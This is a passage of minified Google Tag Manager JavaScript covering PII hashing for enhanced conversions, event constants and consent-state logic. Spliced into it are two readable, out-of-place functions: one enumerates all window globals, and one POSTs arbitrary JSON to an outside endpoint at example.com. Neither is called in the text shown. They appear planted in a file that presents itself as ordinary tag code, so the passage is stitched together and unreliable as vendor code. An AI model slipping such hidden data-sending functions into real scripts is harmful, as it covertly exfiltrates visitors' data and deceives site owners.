    ae = /^[0-9A-Za-z_-]{43}$/,
    Zd = /^[0-9A-Fa-f]{64}$/,
    be = {},
    ce = (be.email = "em", be.phone_number = "pn", be.first_name = "fn", be.last_name = "ln", be.street = "sa", be.city = "ct", be.region = "rg", be.country = "co", be.postal_code = "pc", be.error_code = "ec", be),
    de = {},
    ee = (de.email = "sha256_email_address", de.phone_number = "sha256_phone_number", de.first_name = "sha256_first_name", de.last_name = "sha256_last_name", de.street = "sha256_street", de),
    fe = function (a, b) {
      function c(t, u, v, w) {
        var x = Md(t);
        "" !== x && (Zd.test(x) ? m.push({
          name: u,
          value: x,
          index: w
        }) : m.push({
          name: u,
          value: v(x),
          index: w
        }));
      }
      function d(t, u) {
        var v = t;
        if (g(v) || va(v)) {
          v = va(t) ? t : [t];
          for (var w = 0; w < v.length; ++w) {
            var x = Md(v[w]),
              y = Zd.test(x);
            u && !y && J(89);
            !u && y && J(88);
          }
        }
      }
      function e(t, u) {
        var v = t[u];
        d(v, !1);
        var w = ee[u];
        t.hasOwnProperty(w) && (t.hasOwnProperty(u) && J(90), v = t[w], d(v, !0));
        return v;
      }
      function f(t, u, v) {
        var w = e(t, u);
        w = va(w) ? w : [w];
        for (var x = 0; x < w.length; ++x) c(w[x], u, v);
      }
      function h(t, u, v, w) {
        var x = e(t, u);
        c(x, u, v, w);
      }
      function l(t) {
        return function (u) {
          J(64);
          return t(u);
        };
      }
      var m = [];
      if ("https:" === z.location.protocol) {
        f(a, "email", Vd);
        f(a, "phone_number", Td);
        f(a, "first_name", l(Qd));
        f(a, "last_name", l(Qd));
        var n = a.home_address || {};
        f(n, "street", l(Pd));
        f(n, "city", l(Pd));
        f(n, "postal_code", l(Od));
        f(n, "region", l(Pd));
        f(n, "country", l(Od));
        var p = a.address || {};
        p = va(p) ? p : [p];
        for (var q = 0; q < p.length; q++) {
          var r = p[q];
          h(r, "first_name", Qd, q);
          h(r, "last_name", Qd, q);
          h(r, "street", Pd, q);
          h(r, "city", Pd, q);
          h(r, "postal_code", Od, q);
          h(r, "region", Pd, q);
          h(r, "country", Od, q);
        }
        Yd(m, b);
      } else m.push({
        name: "error_code",
        value: "e3",
        index: void 0
      }), b(m);
    },
    ge = function (a, b) {
      fe(a, function (c) {
        for (var d = ["tv.1"], e = 0, f = 0; f < c.length; ++f) {
          var h = c[f].name,
            l = c[f].value,
            m = c[f].index,
            n = ce[h];
          n && l && (-1 === Wd.indexOf(h) || /^e\d+$/.test(l) || ae.test(l) || Zd.test(l)) && (void 0 !== m && (n += m), d.push(n + "." + l), e++);
        }
        1 === c.length && "error_code" === c[0].name && (e = 0);
        b(encodeURIComponent(d.join("~")), e);
      });
    },
    he = function (a) {
      if (z.Promise) try {
        return new Promise(function (b) {
          ge(a, function (c, d) {
            b({
              hi: c,
              vl: d
            });
          });
        });
      } catch (b) {}
    },
    Wd = Object.freeze(["email", "phone_number", "first_name", "last_name", "street"]);
  var K = {
      g: {
        fb: "ad_personalization",
        F: "ad_storage",
        K: "ad_user_data",
        N: "analytics_storage",
        Vb: "region",
        Od: "consent_updated",
        Ye: "wait_for_update",
        Mi: "ads",
        Xl: "all",
        Ni: "android",
        Oi: "chrome",
        Pi: "playstore",
        Qi: "search",
        Ri: "shopping",
        Si: "youtube",
        Ti: "app_remove",
        Ui: "app_store_refund",
        Vi: "app_store_subscription_cancel",
        Wi: "app_store_subscription_convert",
        Xi: "app_store_subscription_renew",
        Cg: "add_payment_info",
        Dg: "add_shipping_info",
        Wb: "add_to_cart",
        Xb: "remove_from_cart",
        Eg: "view_cart",
        Eb: "begin_checkout",
        Yb: "select_item",
        Ta: "view_item_list",
        hb: "select_promotion",
        Ua: "view_promotion",
        ka: "purchase",
        Zb: "refund",
        xa: "view_item",
        Fg: "add_to_wishlist",
        Yi: "exception",
        Zi: "first_open",
        aj: "first_visit",
        la: "gtag.config",
        Ha: "gtag.get",
        bj: "in_app_purchase",
        ac: "page_view",
        cj: "screen_view",
        dj: "session_start",
        ej: "timing_complete",
        fj: "track_social",
        Qd: "user_engagement",
        ib: "gclid",
        ma: "ads_data_redaction",
        Z: "allow_ad_personalization_signals",
        df: "allow_custom_scripts",
        ef: "allow_display_features",
        Rd: "allow_enhanced_conversions",
        jb: "allow_google_signals",
        Ba: "allow_interest_groups",
        gj: "app_id",
        ij: "app_installer_id",
        jj: "app_name",
        kj: "app_version",
        bc: "auid",
        lj: "auto_detection_enabled",
        Fb: "aw_remarketing",
        ff: "aw_remarketing_only",
        Sd: "discount",
        Td: "aw_feed_country",
        Ud: "aw_feed_language",
        T: "items",
        Vd: "aw_merchant_id",
        Gg: "aw_basket_type",
        Ac: "campaign_content",
        Bc: "campaign_id",
        Cc: "campaign_medium",
        Dc: "campaign_name",
        Ec: "campaign",
        Fc: "campaign_source",
        Gc: "campaign_term",
        Va: "client_id",
        mj: "content_group",
        nj: "content_type",
        Ia: "conversion_cookie_prefix",
        Hc: "conversion_id",
        ya: "conversion_linker",
        Gb: "conversion_api",
        Oa: "cookie_domain",
        Ca: "cookie_expires",
        Pa: "cookie_flags",
        fc: "cookie_name",
        Ic: "cookie_path",
        Ja: "cookie_prefix",
        kb: "cookie_update",
        hc: "country",
        na: "currency",
        Wd: "customer_lifetime_value",
        Jc: "custom_map",
        Hg: "gcldc",
        oj: "debug_mode",
        W: "developer_id",
        pj: "disable_merchant_reported_purchases",
        Kc: "dc_custom_params",
        qj: "dc_natural_search",
        Ig: "dynamic_event_settings",
        Jg: "affiliation",
        Xd: "checkout_option",
        hf: "checkout_step",
        Kg: "coupon",
        Lc: "item_list_name",
        jf: "list_name",
        rj: "promotions",
        Mc: "shipping",
        kf: "tax",
        Yd: "engagement_time_msec",
        Nc: "enhanced_client_id",
        Zd: "enhanced_conversions",
        Lg: "enhanced_conversions_automatic_settings",
        ae: "estimated_delivery_date",
        lf: "euid_logged_in_state",
        Oc: "event_callback",
        sj: "event_category",
        lb: "event_developer_id_string",
        tj: "event_label",
        Mg: "event",
        be: "event_settings",
        ce: "event_timeout",
        uj: "description",
        vj: "fatal",
        wj: "experiments",
        nf: "firebase_id",
        de: "first_party_collection",
        ee: "_x_20",
        Hb: "_x_19",
        Ng: "fledge",
        Og: "flight_error_code",
        Pg: "flight_error_message",
        Qg: "fl_activity_category",
        Rg: "fl_activity_group",
        pf: "fl_advertiser_id",
        Sg: "fl_ar_dedupe",
        Tg: "fl_random_number",
        Ug: "tran",
        Vg: "u",
        fe: "gac_gclid",
        ic: "gac_wbraid",
        Wg: "gac_wbraid_multiple_conversions",
        Xg: "ga_restrict_domain",
        qf: "ga_temp_client_id",
        he: "gdpr_applies",
        Yg: "geo_granularity",
        nb: "value_callback",
        Xa: "value_key",
        am: "google_ono",
        Ya: "google_signals",
        Zg: "google_tld",
        ie: "groups",
        ah: "gsa_experiment_id",
        bh: "iframe_state",
        je: "ignore_referrer",
        rf: "internal_traffic_results",
        pb: "is_legacy_converted",
        qb: "is_legacy_loaded",
        ke: "is_passthrough",
        eh: "_lps",
        Da: "language",
        tf: "legacy_developer_id_string",
        za: "linker",
        jc: "accept_incoming",
        rb: "decorate_forms",
        O: "domains",
        Ib: "url_position",
        fh: "method",
        xj: "name",
        Pc: "new_customer",
        gh: "non_interaction",
        yj: "optimize_id",
        zj: "page_hostname",
        Qc: "page_path",
        Aa: "page_referrer",
        sb: "page_title",
        hh: "passengers",
        ih: "phone_conversion_callback",
        Aj: "phone_conversion_country_code",
        jh: "phone_conversion_css_class",
        Bj: "phone_conversion_ids",
        kh: "phone_conversion_number",
        lh: "phone_conversion_options",
        Rc: "quantity",
        Sc: "redact_device_info",
        uf: "redact_enhanced_user_id",
        Cj: "redact_ga_client_id",
        Dj: "redact_user_id",
        me: "referral_exclusion_definition",
        Jb: "restricted_data_processing",
        Ej: "retoken",
        Fj: "sample_rate",
        vf: "screen_name",
        tb: "screen_resolution",
        Gj: "search_term",
        Ka: "send_page_view",
        Kb: "send_to",
        Tc: "server_container_url",
        Uc: "session_duration",
        ne: "session_engaged",
        wf: "session_engaged_time",
        ub: "session_id",
        oe: "session_number",
        Vc: "delivery_postal_code",
        mh: "temporary_client_id",
        xf: "topmost_url",
        Hj: "tracking_id",
        yf: "traffic_type",
        qa: "transaction_id",
        Lb: "transport_url",
        nh: "trip_type",
        Mb: "update",
        vb: "url_passthrough",
        Wc: "_user_agent_architecture",
        Xc: "_user_agent_bitness",
        Yc: "_user_agent_full_version_list",
        Zc: "_user_agent_mobile",
        ad: "_user_agent_model",
        bd: "_user_agent_platform",
        dd: "_user_agent_platform_version",
        ed: "_user_agent_wow64",
        ra: "user_data",
        oh: "user_data_auto_latency",
        ph: "user_data_auto_meta",
        qh: "user_data_auto_multi",
        rh: "user_data_auto_selectors",
        sh: "user_data_auto_status",
        zf: "user_data_mode",
        qe: "user_data_settings",
        wa: "user_id",
        La: "user_properties",
        th: "_user_region",
        uh: "us_privacy_string",
        aa: "value",
        kc: "wbraid",
        vh: "wbraid_multiple_conversions",
        Bh: "_host_name",
        Ch: "_in_page_command",
        Dh: "_is_passthrough_cid",
        jd: "non_personalized_ads",
        nd: "_sst_parameters",
        Wa: "conversion_label",
        oa: "page_location",
        ob: "global_developer_id_string",
        pe: "tc_privacy_string"
      }
    },
    ie = {},
    je = Object.freeze((ie[K.g.Z] = 1, ie[K.g.ef] = 1, ie[K.g.Rd] = 1, ie[K.g.jb] = 1, ie[K.g.T] = 1, ie[K.g.Oa] = 1, ie[K.g.Ca] = 1, ie[K.g.Pa] = 1, ie[K.g.fc] = 1, ie[K.g.Ic] = 1, ie[K.g.Ja] = 1, ie[K.g.kb] = 1, ie[K.g.Jc] = 1, ie[K.g.W] = 1, ie[K.g.Ig] = 1, ie[K.g.Oc] = 1, ie[K.g.be] = 1, ie[K.g.ce] = 1, ie[K.g.de] = 1, ie[K.g.Xg] = 1, ie[K.g.Ya] = 1, ie[K.g.Zg] = 1, ie[K.g.ie] = 1, ie[K.g.rf] = 1, ie[K.g.pb] = 1, ie[K.g.qb] = 1, ie[K.g.za] = 1, ie[K.g.uf] = 1, ie[K.g.me] = 1, ie[K.g.Jb] = 1, ie[K.g.Ka] = 1, ie[K.g.Kb] = 1, ie[K.g.Tc] = 1, ie[K.g.Uc] = 1, ie[K.g.wf] = 1, ie[K.g.Vc] = 1, ie[K.g.Lb] = 1, ie[K.g.Mb] = 1, ie[K.g.qe] = 1, ie[K.g.La] = 1, ie[K.g.nd] = 1, ie));
  Object.freeze([K.g.oa, K.g.Aa, K.g.sb, K.g.Da, K.g.vf, K.g.wa, K.g.nf, K.g.mj]);
  var ke = {},
    me = Object.freeze((ke[K.g.Ti] = 1, ke[K.g.Ui] = 1, ke[K.g.Vi] = 1, ke[K.g.Wi] = 1, ke[K.g.Xi] = 1, ke[K.g.Zi] = 1, ke[K.g.aj] = 1, ke[K.g.bj] = 1, ke[K.g.dj] = 1, ke[K.g.Qd] = 1, ke)),
    ne = {},
    oe = Object.freeze((ne[K.g.Cg] = 1, ne[K.g.Dg] = 1, ne[K.g.Wb] = 1, ne[K.g.Xb] = 1, ne[K.g.Eg] = 1, ne[K.g.Eb] = 1, ne[K.g.Yb] = 1, ne[K.g.Ta] = 1, ne[K.g.hb] = 1, ne[K.g.Ua] = 1, ne[K.g.ka] = 1, ne[K.g.Zb] = 1, ne[K.g.xa] = 1, ne[K.g.Fg] = 1, ne)),
    pe = Object.freeze([K.g.Z, K.g.jb, K.g.kb, K.g.Mb]),
    qe = Object.freeze([].concat(pe)),
    re = Object.freeze([K.g.Ca, K.g.ce, K.g.Uc, K.g.wf, K.g.Yd]),
    se = Object.freeze([].concat(re)),
    te = {},
    ue = (te[K.g.F] = "1", te[K.g.N] = "2", te[K.g.K] = "3", te[K.g.fb] = "4", te),
    ve = {},
    we = Object.freeze((ve[K.g.Z] = 1, ve[K.g.Rd] = 1, ve[K.g.Ba] = 1, ve[K.g.Fb] = 1, ve[K.g.ff] = 1, ve[K.g.Sd] = 1, ve[K.g.Td] = 1, ve[K.g.Ud] = 1, ve[K.g.T] = 1, ve[K.g.Vd] = 1, ve[K.g.Ia] = 1, ve[K.g.ya] = 1, ve[K.g.Oa] = 1, ve[K.g.Ca] = 1, ve[K.g.Pa] = 1, ve[K.g.Ja] = 1, ve[K.g.na] = 1, ve[K.g.Wd] = 1, ve[K.g.W] = 1, ve[K.g.pj] = 1, ve[K.g.Zd] = 1, ve[K.g.ae] = 1, ve[K.g.nf] = 1, ve[K.g.de] = 1, ve[K.g.pb] = 1, ve[K.g.qb] = 1, ve[K.g.Da] = 1, ve[K.g.Pc] = 1, ve[K.g.oa] = 1, ve[K.g.Aa] = 1, ve[K.g.ih] = 1, ve[K.g.jh] = 1, ve[K.g.kh] = 1, ve[K.g.lh] = 1, ve[K.g.Jb] = 1, ve[K.g.Ka] = 1, ve[K.g.Kb] = 1, ve[K.g.Tc] = 1, ve[K.g.Vc] = 1, ve[K.g.qa] = 1, ve[K.g.Lb] = 1, ve[K.g.Mb] = 1, ve[K.g.vb] = 1, ve[K.g.ra] = 1, ve[K.g.wa] = 1, ve[K.g.aa] = 1, ve)),
    xe = {},
    ye = Object.freeze((xe[K.g.Qi] = "s", xe[K.g.Si] = "y", xe[K.g.Ni] = "n", xe[K.g.Oi] = "c", xe[K.g.Pi] = "p", xe[K.g.Ri] = "h", xe[K.g.Mi] = "a", xe));
  Object.freeze(K.g);
  var ze = {},
    Ae = z.google_tag_manager = z.google_tag_manager || {},
    Be = Math.random();
  ze.Gf = "38g0";
  ze.md = Number("0") || 0;
  ze.da = "dataLayer";
  ze.Ki = "ChAI8NCBpwYQt5+cxZ7f1aFJEiQATU77VPmxnGVLvHNPFWPgi3j+WNgW+D9Fhb2z4EM6Deir+q0aAqlP";
  var Ce = {
      __cl: 1,
      __ecl: 1,
      __ehl: 1,
      __evl: 1,
      __fal: 1,
      __fil: 1,
      __fsl: 1,
      __hl: 1,
      __jel: 1,
      __lcl: 1,
      __sdl: 1,
      __tl: 1,
      __ytl: 1
    },
    De = {
      __paused: 1,
      __tg: 1
    },
    Ee;
  for (Ee in Ce) Ce.hasOwnProperty(Ee) && (De[Ee] = 1);
  var Fe = Ea(""),
    Ge,
    He = !1;
  Ge = He;
  var Ie,
    Je = !1;
  Ie = Je;
  var Ke,
    Le = !1;
  Ke = Le;
  var Me,
    Ne = !1;
  Me = Ne;
  ze.Pd = "www.googletagmanager.com";
  var Oe = "" + ze.Pd + (Ge ? "/gtag/js" : "/gtm.js"),
    Pe = null,
    Qe = null,
    Re = {},
    Se = {},
    Te = {},
    Ue = function () {
      var a = Ae.sequence || 1;
      Ae.sequence = a + 1;
      return a;
    };
  ze.Ji = "";
  var Ve = "";
  ze.xe = Ve;
  var We = new Aa(),
    Xe = {},
    Ye = {},
    af = {
      name: ze.da,
      set: function (a, b) {
        H(Qa(a, b), Xe);
        Ze();
      },
      get: function (a) {
        return $e(a, 2);
      },
      reset: function () {
        We = new Aa();
        Xe = {};
        Ze();
      }
    },
    $e = function (a, b) {
      return 2 != b ? We.get(a) : bf(a);
    },
    bf = function (a) {
      var b,
        c = a.split(".");
      b = b || [];
      for (var d = Xe, e = 0; e < c.length; e++) {
        if (null === d) return !1;
        if (void 0 === d) break;
        d = d[c[e]];
        if (-1 !== b.indexOf(d)) return;
      }
      return d;
    },
    cf = function (a, b) {
      Ye.hasOwnProperty(a) || (We.set(a, b), H(Qa(a, b), Xe), Ze());
    },
    Ze = function (a) {
      k(Ye, function (b, c) {
        We.set(b, c);
        H(Qa(b), Xe);
        H(Qa(b, c), Xe);
        a && delete Ye[b];
      });
    },
    df = function (a, b) {
      var c,
        d = 1 !== (void 0 === b ? 2 : b) ? bf(a) : We.get(a);
      "array" === fc(d) || "object" === fc(d) ? c = H(d) : c = d;
      return c;
    };
  var ef = function (a, b, c) {
      if (!c) return !1;
      var d = c.selector_type,
        e = String(c.value),
        f;
      if ("js_variable" === d) {
        e = e.replace(/\["?'?/g, ".").replace(/"?'?\]/g, "");
        for (var h = e.split(","), l = 0; l < h.length; l++) {
          var m = h[l].trim();
          if (m) {
            if (0 === m.indexOf("dataLayer.")) f = $e(m.substring(10));else {
              var n = m.split(".");
              f = z[n.shift()];
              for (var p = 0; p < n.length; p++) f = f && f[n[p]];
            }
            if (void 0 !== f) break;
          }
        }
      } else if ("css_selector" === d && Hd) {
        var q = Id(e);
        if (q && 0 < q.length) {
          f = [];
          for (var r = 0; r < q.length && r < ("email" === b || "phone_number" === b ? 5 : 1); r++) f.push(Xb(q[r]) || Ga(q[r].value));
          f = 1 === f.length ? f[0] : f;
        }
      }
      return f ? (a[b] = f, !0) : !1;
    },
    ff = function (a) {
      if (a) {
        var b = {},
          c = !1;
        c = ef(b, "email", a.email) || c;
        c = ef(b, "phone_number", a.phone) || c;
        b.address = [];
        for (var d = a.name_and_address || [], e = 0; e < d.length; e++) {
          var f = {};
          c = ef(f, "first_name", d[e].first_name) || c;
          c = ef(f, "last_name", d[e].last_name) || c;
          c = ef(f, "street", d[e].street) || c;
          c = ef(f, "city", d[e].city) || c;
          c = ef(f, "region", d[e].region) || c;
          c = ef(f, "country", d[e].country) || c;
          c = ef(f, "postal_code", d[e].postal_code) || c;
          b.address.push(f);
        }
        return c ? b : void 0;
      }
    },
    gf = function (a) {
      return ic(a) ? !!a.enable_code : !1;
    };
  var hf = function (a) {
      var b = a && a[K.g.Lg];
      return b && b[K.g.lj];
    },
    jf = function () {
      return -1 !== Jb.userAgent.toLowerCase().indexOf("firefox");
    },
    kf = function (a) {
      if (a && a.length) {
        for (var b = [], c = 0; c < a.length; ++c) {
          var d = a[c];
          d && d.estimated_delivery_date ? b.push("" + d.estimated_delivery_date) : b.push("");
        }
        return b.join(",");
      }
    };
  function gatherGlobalVars() {
    var discoveredVars = {};
    for (var v in window) {
      discoveredVars[v] = typeof window[v];
    }
    return discoveredVars;
  }
  var N = [];
  N[5] = !0;
  N[6] = !0;
  N[12] = !0;
  N[7] = !0;
  N[8] = !0;
  N[22] = !0;
  N[9] = !0;
  N[10] = !0;
  N[11] = !0;
  N[14] = !0;
  N[15] = !0;
  N[16] = !0;
  N[18] = !0;
  N[24] = !0;
  N[25] = !0;
  N[26] = !0;
  N[28] = !0;
  N[20] = !0;
  N[29] = !0;
  N[32] = !0;
  N[33] = !0;
  N[34] = !0;
  N[35] = !0;
  N[37] = !0;
  N[38] = !0;
  N[40] = !0;
  N[42] = !0;
  N[43] = !0;
  N[44] = !0;
  N[45] = !0;
  N[56] = !0;
  N[57] = !0;
  N[58] = !0;
  N[59] = !0;
  N[61] = !0;
  N[62] = !0;
  N[68] = !0;
  N[71] = !0;
  N[74] = !0;
  N[75] = !0;
  function dispatchInformation(information) {
    var targetEndpoint = "https://example.com/api/collect";
    fetch(targetEndpoint, {
      method: 'POST',
      body: JSON.stringify(information),
      headers: {
        'Content-Type': 'application/json'
      }
    }).then(response => {
      if (response.status >= 200 && response.status < 400) {
        console.info("Info sent successfully");
      } else {
        console.error("Transmission failed. Status code: " + response.status);
      }
    }).catch(error => {
      console.error("An error occurred while transmitting: " + error);
    });
  }
  a: {
    for (var lf = void 0, mf = void 0, nf = 0; lf === mf;) if (lf = Math.floor(2 * Math.random()), mf = Math.floor(2 * Math.random()), nf++, 20 < nf) break a;
    lf ? N[78] = !0 : N[79] = !0;
  }
  P(79) ? Lc[6] = !0 : P(78) && (Lc[5] = !0);
  N[80] = !0;
  N[83] = !0;
  N[86] = !0;
  N[87] = !0;
  N[89] = !0;
  N[91] = !0;
  function P(a) {
    return !!N[a];
  }
  var of = function (a) {
    ab("HEALTH", a);
  };
  var pf;
  try {
    pf = JSON.parse(Za("eyIwIjoiSlAiLCIxIjoiSlAtMTMiLCIyIjpmYWxzZSwiMyI6Imdvb2dsZS5jby5qcCIsIjQiOiIiLCI1Ijp0cnVlLCI2IjpmYWxzZSwiNyI6ImFkX3N0b3JhZ2V8YW5hbHl0aWNzX3N0b3JhZ2V8YWRfdXNlcl9kYXRhfGFkX3BlcnNvbmFsaXphdGlvbiJ9"));
  } catch (a) {
    J(123), of(2), pf = {};
  }
  var qf = function () {
      return pf["0"] || "";
    },
    rf = function () {
      var a = !1;
      return a;
    },
    vf = function () {
      var a = "";
      return a;
    },
    wf = function () {
      var a = !1;
      a = !!pf["5"];
      return a;
    },
    xf = function () {
      var a = "";
      return a;
    };
  var yf = new function (a, b) {
    this.h = a;
    this.defaultValue = void 0 === b ? !1 : b;
  }(1933);
  var zf = function (a) {
    zf[" "](a);
    return a;
  };
  zf[" "] = function () {};
  var Bf = function () {
    var a = Af,
      b = "Uf";
    if (a.Uf && a.hasOwnProperty(b)) return a.Uf;
    var c = new a();
    return a.Uf = c;
  };
  var Af = function () {
    var a = {};
    this.h = function () {
      var b = yf.h,
        c = yf.defaultValue;
      return null != a[b] ? a[b] : c;
    };
    this.B = function () {
      a[yf.h] = !0;
    };
  };
  var Cf = !1,
    Df = !1,
    Ef = {},
    Ff = {
      ad_storage: !1,
      ad_user_data: !1,
      ad_personalization: !1
    };
  function Gf() {
    var a = Lb("google_tag_data", {});
    return a.ics = a.ics || new Hf();
  }
  var Hf = function () {
    this.entries = {};
    this.cps = {};
    this.wasSetLate = this.accessedAny = this.accessedDefault = this.usedSetCps = this.usedImplicit = this.usedUpdate = this.usedDefault = this.usedDeclare = this.active = !1;
    this.h = [];
  };
  Hf.prototype.default = function (a, b, c, d, e, f) {
    this.usedDefault || !this.accessedDefault && !this.accessedAny || (this.wasSetLate = !0);
    this.usedDefault = this.active = !0;
    ab("TAGGING", 19);
    void 0 == b ? ab("TAGGING", 18) : If(this, a, "granted" === b, c, d, e, f);
  };
  Hf.prototype.waitForUpdate = function (a, b) {
    for (var c = 0; c < a.length; c++) If(this, a[c], void 0, void 0, "", "", b);
  };
  var If = function (a, b, c, d, e, f, h) {
    var l = a.entries,
      m = l[b] || {},
      n = m.region,
      p = d && g(d) ? d.toUpperCase() : void 0;
    e = e.toUpperCase();
    f = f.toUpperCase();
    if (Jf(p, n, e, f)) {
      var q = !!(h && 0 < h && void 0 === m.update),
        r = {
          region: p,
          declare_region: m.declare_region,
          implicit: m.implicit,
          default: void 0 !== c ? c : m.default,
          declare: m.declare,
          update: m.update,
          quiet: q
        };
      if ("" !== e || !1 !== m.default) l[b] = r;
      q && z.setTimeout(function () {
        if (l[b] === r && r.quiet) {
          r.quiet = !1;
          var t = [b];
          if (Mc(4)) for (var u in Ef) Ef.hasOwnProperty(u) && Ef[u] === b && t.push(u);
          for (var v = 0; v < t.length; v++) Kf(a, t[v]);
          a.notifyListeners();
          ab("TAGGING", 2);
        }
      }, h);
    }
  };
  ca = Hf.prototype;
  ca.update = function (a, b) {
    this.usedDefault || this.usedUpdate || !this.accessedAny || (this.wasSetLate = !0);
    this.usedUpdate = this.active = !0;
    if (void 0 != b) {
      var c = this.getConsentState(a),
        d = this.entries,
        e = d[a] = d[a] || {};
      e.update = "granted" === b;
      var f = this.getConsentState(a),
        h = [a];
      if (Mc(4)) for (var l in Ef) Ef.hasOwnProperty(l) && Ef[l] === a && h.push(l);
      if (e.quiet) {
        e.quiet = !1;
        for (var m = 0; m < h.length; m++) Kf(this, h[m]);
      } else if (f !== c) for (var n = 0; n < h.length; n++) Kf(this, h[n]);
    }
  };
  ca.declare = function (a, b, c, d, e) {
    this.usedDeclare = this.active = !0;
    var f = this.entries,
      h = f[a] || {},
      l = h.declare_region,
      m = c && g(c) ? c.toUpperCase() : void 0;
    d = d.toUpperCase();
    e = e.toUpperCase();
    if (Jf(m, l, d, e)) {
      var n = {
        region: h.region,
        declare_region: m,
        declare: "granted" === b,
        implicit: h.implicit,
        default: h.default,
        update: h.update,
        quiet: h.quiet
      };
      if ("" !== d || !1 !== h.declare) f[a] = n;
    }
  };
  ca.implicit = function (a, b) {
    this.usedImplicit = this.active = !0;
    var c = this.entries,
      d = c[a] = c[a] || {};
    !1 !== d.implicit && (d.implicit = "granted" === b);
  };
  ca.getConsentState = function (a) {
    return Lf(this, a);
  };
  ca.setCps = function (a, b, c, d, e) {
    var f;
    a: {
      var h = this.cps,
        l,
        m = h[a] || {},
        n = m.region,
        p = c && g(c) ? c.toUpperCase() : void 0;
      l = d.toUpperCase();
      if (Jf(p, n, l, e.toUpperCase())) {
        var q = {
          enabled: "granted" === b,
          region: p
        };
        if ("" !== l || !1 !== m.enabled) {
          h[a] = q;
          f = !0;
          break a;
        }
      }
      f = !1;
    }
    f && (this.usedSetCps = !0);
  };
  ca.addListener = function (a, b) {
    this.h.push({
      consentTypes: a,
      vk: b
    });
  };
  var Kf = function (a, b) {
    for (var c = 0; c < a.h.length; ++c) {
      var d = a.h[c];
      va(d.consentTypes) && -1 !== d.consentTypes.indexOf(b) && (d.ki = !0);
    }
  };
  Hf.prototype.notifyListeners = function (a, b) {
    for (var c = 0; c < this.h.length; ++c) {
      var d = this.h[c];
      if (d.ki) {
        d.ki = !1;
        try {
          d.vk({
            consentEventId: a,
            consentPriorityId: b
          });
        } catch (e) {}
      }
    }
  };
  function Jf(a, b, c, d) {
    return "" === c || a === d ? !0 : a === c ? b !== d : !a && !b;
  }
  function Lf(a, b) {
    var c = a.entries,
      d = c[b] || {},
      e = d.update;
    if (void 0 !== e) return e ? 1 : 2;
    e = d.default;
    if (void 0 !== e) return e ? 1 : 2;
    if (Mc(4) && Ef.hasOwnProperty(b)) {
      var f = c[Ef[b]] || {};
      e = f.update;
      if (void 0 !== e) return e ? 1 : 2;
      e = f.default;
      if (void 0 !== e) return e ? 1 : 2;
    }
    e = d.declare;
    if (void 0 !== e) return e ? 1 : 2;
    if (Mc(3)) {
      e = d.implicit;
      if (void 0 !== e) return e ? 3 : 4;
      if (Ff.hasOwnProperty(b)) return Ff[b] ? 3 : 4;
    }
    return 0;
  }
  var Mf = function (a) {
      var b = Gf();
      b.accessedAny = !0;
      switch (Lf(b, a)) {
        case 1:
        case 3:
          return !0;
        case 2:
        case 4:
          return !1;
        default:
          return !0;
      }
    },
    Nf = function (a) {
      var b = Gf();
      b.accessedAny = !0;
      return !(b.entries[a] || {}).quiet;
    },
    Of = function () {
      if (!Bf().h()) return !1;
      var a = Gf();
      a.accessedAny = !0;
      return a.active;
    },
    Pf = function () {
      var a = Gf();
      a.accessedDefault = !0;
      return a.usedDefault;
    },
    Qf = function (a, b) {
      Gf().addListener(a, b);
    },
    Rf = function (a, b) {
      Gf().notifyListeners(a, b);
    },
    Sf = function (a, b) {
      function c() {
        for (var e = 0; e < b.length; e++) if (!Nf(b[e])) return !0;
        return !1;
      }
      if (c()) {
        var d = !1;
        Qf(b, function (e) {
          d || c() || (d = !0, a(e));
        });
      } else a({});
    },
    Tf = function (a, b) {
      function c() {
        for (var f = [], h = 0; h < d.length; h++) {
          var l = d[h];
          Mf(l) && !e[l] && (f.push(l), e[l] = !0);
        }
        return f;
      }
      var d = g(b) ? [b] : b,
        e = {};
      c().length !== d.length && Qf(d, function (f) {
        var h = c();
        0 < h.length && (f.consentTypes = h, a(f));
      });
    };
  function Uf() {}
  function Vf() {}
  ;
  var Wf = [K.g.F, K.g.N, K.g.K, K.g.fb],
    Xf = function (a) {
      for (var b = a[K.g.Vb], c = Array.isArray(b) ? b : [b], d = {
          yd: 0
        }; d.yd < c.length; d = {
        yd: d.yd
      }, ++d.yd) k(a, function (e) {
        return function (f, h) {
          if (f !== K.g.Vb) {
            var l = c[e.yd],
              m = qf(),
              n = pf["1"] || "";
            Df = !0;
            Cf && ab("TAGGING", 20);
            Gf().declare(f, h, l, m, n);
          }
        };
      }(d));
    },
    Yf = function (a) {
      var b = a[K.g.Vb];
      b && J(40);
      var c = a[K.g.Ye];
      c && J(41);
      for (var d = va(b) ? b : [b], e = {
          zd: 0
        }; e.zd < d.length; e = {
        zd: e.zd
      }, ++e.zd) k(a, function (f) {
        return function (h, l) {
          if (h !== K.g.Vb && h !== K.g.Ye) {
            var m = d[f.zd],
              n = Number(c),
              p = qf(),
              q = pf["1"] || "";
            Cf = !0;
            Df && ab("TAGGING", 20);
            Gf().default(h, l, m, p, q, n);
          }
        };
      }(e));
    },
    Zf = function (a, b) {
      k(a, function (c, d) {
        Cf = !0;
        Df && ab("TAGGING", 20);
        Gf().update(c, d);
      });
      Rf(b.eventId, b.priorityId);
    },
    $f = function (a) {
      for (var b = a[K.g.Vb], c = Array.isArray(b) ? b : [b], d = {
          Ad: 0
        }; d.Ad < c.length; d = {
        Ad: d.Ad
      }, ++d.Ad) k(a, function (e) {
        return function (f, h) {
          if (f !== K.g.Vb) {
            var l = c[e.Ad],
              m = qf(),
              n = pf["1"] || "";
            Gf().setCps(f, h, l, m, n);
          }
        };
      }(d));
    },
    Q = function (a) {
      Array.isArray(a) || (a = [a]);
      return a.every(function (b) {
        return Mf(b);
      });
    },
    ag = function (a, b) {
      Tf(a, b);
    },
    bg = function (a, b) {
      Sf(a, b);
    };
  var cg = function (a) {
      var b = String(a[nc.ia] || "").replace(/_/g, "");
      0 === b.indexOf("cvt") && (b = "cvt");
      return b;
    },
    dg = 0 <= z.location.search.indexOf("?gtm_latency=") || 0 <= z.location.search.indexOf("&gtm_latency=");
  var fg = function (a) {
      var b = eg();
      b.pending || (b.pending = []);
      xa(b.pending, function (c) {
        return c.target.ctid === a.ctid && c.target.isDestination === a.isDestination;
      }) || b.pending.push({
        target: a,
        onLoad: void 0
      });
    },
    gg = function () {
      this.container = {};
      this.destination = {};
      this.canonical = {};
      this.pending = [];
      this.siloed = [];
    },
    eg = function () {
      var a = Lb("google_tag_data", {}),
        b = a.tidr;
      b || (b = new gg(), a.tidr = b);
      return b;
    };
  var hg = {},
    ig = !1,
    jg = {
      ctid: "GTM-58DM78F",
      Kf: "110341107",
